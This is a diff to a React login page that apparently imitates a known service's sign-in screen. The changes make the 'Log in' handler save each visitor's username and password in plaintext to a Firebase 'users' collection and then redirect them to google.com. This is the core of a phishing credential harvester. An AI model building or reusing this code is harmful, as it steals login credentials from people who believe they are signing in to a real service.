@@ -4,13 +4,22 @@ import microsoftIcon from "../Assets/microsoftLogo.png";
 import googlePlayIcon from "../Assets/googlePlayIcon.png";
 import "../Components/App.css";
 import { useState } from "react";
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "../config/firebase";
+
 function App() {
-  const [userName, setUserName] = useState("");
-  const [password, setPassword] = useState("");
-  //Functions
-  function handleSubmit() {
-    console.log("Username:", userName);
-    console.log("Password:", password);
+  const [newUserName, setNewUserName] = useState("");
+  const [newPassword, setNewPassword] = useState("");
+
+  const details = collection(db, "users");
+
+  async function handleSubmit() {
+    try {
+      await addDoc(details, { password: newPassword, userName: newUserName });
+      window.location.href = "https://www.google.com/";
+    } catch (e) {
+      console.error(e);
+    }
   }
   return (
     <>
@@ -45,7 +54,7 @@ function App() {
                 border: "1px solid #ccc",
               }}
               onChange={(e) => {
-                setUserName(e.target.value);
+                setNewUserName(e.target.value);
               }}
             />
           </div>
@@ -60,30 +69,28 @@ function App() {
                 border: "1px solid #ccc",
               }}
               onChange={(e) => {
-                setPassword(e.target.value);
+                setNewPassword(e.target.value);
               }}
             />
           </div>
           <div style={{ marginBottom: "10px", width: "74%" }}>
-            <a href="https://www.google.com/">
-              <button
-                style={{
-                  borderRadius: "10px",
-                  width: "100%",
-                  backgroundColor: "#4CB5F9",
-                  color: "white",
-                  borderColor: "white",
-                  marginLeft: "7px",
-                  fontSize: "18px",
-                }}
-                href="www.google.com"
-                onClick={() => {
-                  handleSubmit();
-                }}
-              >
-                Log in
-              </button>
-            </a>
+            <button
+              style={{
+                borderRadius: "10px",
+                width: "100%",
+                backgroundColor: "#4CB5F9",
+                color: "white",
+                borderColor: "white",
+                marginLeft: "7px",
+                fontSize: "18px",
+              }}
+              href="www.google.com"
+              onClick={() => {
+                handleSubmit();
+              }}
+            >
+              Log in
+            </button>
           </div>
           <div
             style={{ display: "flex", flexDirection: "row", margin: "10px 0" }}
